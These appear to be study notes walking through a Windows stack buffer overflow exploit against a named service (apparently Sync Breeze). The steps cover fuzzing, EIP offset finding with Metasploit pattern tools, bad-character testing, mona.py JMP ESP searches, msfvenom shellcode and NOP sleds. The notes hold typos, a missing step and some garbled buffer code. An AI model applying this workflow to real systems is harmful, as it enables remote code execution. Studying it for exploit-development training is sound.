1- Identify the seeding point.
2- Use Microsoft TCP view to on which process program is listening.
3- Always open imuunity debugger with admin rights to get list of all programs installed.
4- Then find a seeding point of the application.
5- Then create a basic fuzzer which increases the input chars on every iteration and add 10s time delay between every iteration. If the application crashes via
Access Violation at then we might have a BoF.
7- Not the input bytes on which the application crashes i.e. 800 bytes. Verify it, by giving all A's into those chars and check
EIP is filled with A chars.
8- Now next step is of controlling EIP. For this we used no repeating string of 4 bytes chunks generated by msf and give that as buffer input.
command: msf-pattern_create -l <SizeOfBuffer>
9- Now take the value of EIP and check the offset:
command: msf-pattern_offset -l <SizeOfBuffer> -q <EIPValue>
lets say command outputs offset as 780.
10- Now distribute input buffer as below to ensure that we can control the EIP.

filler = "A" * 780
offset = "B" * 4
buffer = "C" * 16

input = filler + offset + buffer

Now if EIP is filled with B chars, that confirms our control of EIP. Now take note of ESP value since it's pointing to the
next stack in memory once BOF is done and we will write our shellcode there. Catch here is ESP changes it's value randomly 
on every start so we cannot hardcode it.

Also note the number of chars between EIP and ESP.

11- Now verify if we have enough space in buffer to place our shell code i.e. 350-400 bytes. Now we increase the buffer length 
from 800 to 1500 and check if that works.

filler = "A" * 780
eip = "B" * 4
offset = "C" * 4 //to fill the space between EIP and ESP
buffer =  "D" * (1500 - len(filler) - len(eip) - len(offset)) 
	
input = filler + eip + offset + buffer

12- Now we have to check for bad chars for this application. For this purpose we replace D's with all Hex character from 
0x00 - 0xFF and check where application crashes. Now after executing the crash, right click on ESP and select "follow in dump".
This is hit and trial, and we have to do this till we find all bad chars.


filler = "A" * 780
eip = "B" * 4
offset = "C" * 4 //to fill the space between EIP and ESP
buffer =  "0x01-0FF"// 0x00 was null byte in our example. 

input = filler + eip + offset + buffer

13- Now we have to change ESP value to or Buffer value where our shellcode will be residing. We cannot hardcode it, since
ESP value changes at every crash. So we will make use of "JMP ESP" command.

14- 2 conditions have to be met for the address of JMP ESP instructions:
	a- it should be static
	b- it doesnot contain any bad chars

15- We will be using mona.py to search for address. 

!mona modules - gives information of all the modules loaded by sync breeze in process memory space.

Now search for modules with our suitable specifications like
	a- base address doesn't have any bad chars
	b- all safe flag false

16- Now we will search for naturally occurring "JMP ESP" instruction within the selected module.

17- "msf-nasm_shell" will be used for determing the op code for our desired insturction.

18- !mona find -s "\xff\xe4" -m "libspp.dll" -> to find the specific opcode in our specified operation. Once we find the address for our instruction check for bad chars
in the address as well.

19- Verify the address by goto button in disambbler window.

20- Update the EIP address in our script in "REVERSE ORDER" due to little NDN byte format.

21- Create a shellcode with msfvenom with -e flag to tell encoding scheme -b to tell bad chars.

22- Now due to GetPC routine few bytes of our encoded shell code gets overwritten by the program so we need to create a landing space for our shellcode to work. We can do
this by using NOP character with hex "0x90" 
